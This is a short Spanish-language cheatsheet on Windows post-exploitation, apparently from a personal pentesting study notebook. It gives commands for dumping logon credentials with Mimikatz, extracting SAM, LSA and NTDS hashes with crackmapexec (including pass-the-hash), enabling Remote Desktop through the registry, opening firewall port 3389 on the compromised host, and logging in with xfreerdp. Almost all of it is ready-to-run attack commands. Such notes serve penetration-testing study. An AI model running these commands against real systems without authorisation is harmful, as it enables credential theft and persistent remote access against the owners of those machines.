# Windows Post-Ex

## Mimikatz

Generalmente tanto en Kali como en Parrot podemos localizar el binario de Mimikatz que tengamos a mano, pero siempre podemos buscarlo por google.

Lo importante es enviarlo ([Envío de archivos Cheatsheet](../../../herramientas/envio-de-archivos-cheatsheet.md)) a la máquina atacada y ejecutarlo

```
sekurlsa::logonpasswords #Podemos sacar usuarios y contraseñas
```

## Crackmapexec

Podemos obtener información a través de crackmapexec si existe un servicio samba habilitado y tenemos credenciales válidas.

```
crackmapexec smb <ip> -u <usuario> -p <contraseña> --sam
crackmapexec smb <ip> -u <usuario> -p <contraseña> --lsa
crackmapexec smb <ip> -u <usuario> -p <contraseña> --ntds

#Puedes realizarlo a través de un pass the hash usando el 
#parámetro "-H" en vez de la contraseña
```

## Activar Escritorio Remoto

Puede sernos útil en ocasiones activar el escritorio remoto para conseguir realizar algunas acciones que de otra forma no podríamos. En primer lugar tenemos que cambiar los registros para activarlo.

```
reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f
```

Si existe algún Firewall en el equipo tenemos que permitir las conexiones por el puerto por defecto de WRE.

```
netsh advfirewall firewall add rule name="RDP Port" protocol=TCP dir=in localport=3389 action=allow
netsh advfirewall firewall add rule name="RDP Port" protocol=TCP dir=out localport=3389 action=allow
```

Podemos comprobar si queremos con nmap si realmente está abierto y accesible.

```
nmap -p3389 --open -n -Pn T5 <IP>
```

Teniendo credenciales válidas podemos usar herramientas cómo xfreerdp para conectarnos.

```
xfreerdp /u:<nombreusuario> /d:WORKGROUP /p:<contraseña> /v:<IP>
```

> \*Disclaimer: Este manual está realizado en base a lo que voy aprendiendo, si parte de la información que comparto no es correcta estaré encantado de que te pongas en contacto conmigo para hacérmelo saber y poder modificarlo.
